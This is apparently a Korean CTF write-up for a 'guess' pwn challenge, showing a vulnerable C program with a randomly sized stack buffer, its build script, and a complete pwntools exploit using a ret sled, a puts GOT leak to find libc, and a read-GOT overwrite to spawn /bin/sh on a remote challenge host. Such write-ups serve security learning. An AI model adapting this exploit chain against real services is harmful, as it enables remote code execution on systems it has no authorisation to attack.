---
layout: post
title: 19th Hacking CTF guess writeip

date: 2019-02-21
tags: [writeup]

---

ret sled + 64bit ROP



generator.py
```python
#!/usr/bin/python2.7
import os
import uuid

rand_value = int(os.urandom(4).encode('hex'), 16) % 500 
UUID = "-" + str(uuid.uuid4())

SRC = "/home/guess/guess.c"
OUT = "/tmp/guess" + UUID

os.system(("gcc -DLENGTH={} -mpreferred-stack-boundary=4  -fno-stack-protector -o " + OUT + " " + SRC).format(rand_value))
os.system(OUT)
os.system("rm -rf " + OUT)
```
guess.c
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

int main(void)
{
    setvbuf(stdout,NULL,_IONBF,0);
    setvbuf(stdin,NULL,_IONBF,0);
    
	char buf[LENGTH];
    	
	memset(buf,0,LENGTH);
    puts("Input String!");
	read(0,buf,0x300);
	return 0;
}
```
**랜덤한 크기로 buf가 생성된다. buf 크기를 정확히 모르기 때문에 그냥 ret sled처럼 ret주소를 많이 주고 rop해줬다. 한 번에 쉘이 안 따일 수도 있기 때문에 계속 해보면 쉘이 따인다.**

exploit.py
```python
from pwn import*

#p = process("./guess")
p = remote('pwnable.shop', 10003)
e = ELF("./guess")

pr = 0x400763
ppr = 0x400761
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
bss = e.bss()
binsh = "/bin/sh"
ret = 0x4006ff

p.recv(1024)

pay  = p64(ret)*50
pay += p64(pr)+p64(puts_got)+p64(puts_plt)
pay += p64(pr)+p64(0)+p64(ppr)+p64(bss)+p64(len(binsh))+p64(read_plt)
pay += p64(pr)+p64(0)+p64(ppr)+p64(read_got)+p64(8)+p64(read_plt)
pay += p64(pr)+p64(bss)+p64(read_plt)

p.send(pay)

puts = u64(p.recv(6)+"\x00\x00")
libc_base = puts - 0x6f690
system = libc_base + 0x45390

print "puts =" + hex(puts)
print "libc_base =" + hex(libc_base)
print "system =" + hex(system)

p.send(binsh)
p.send(p64(system))

p.interactive()
```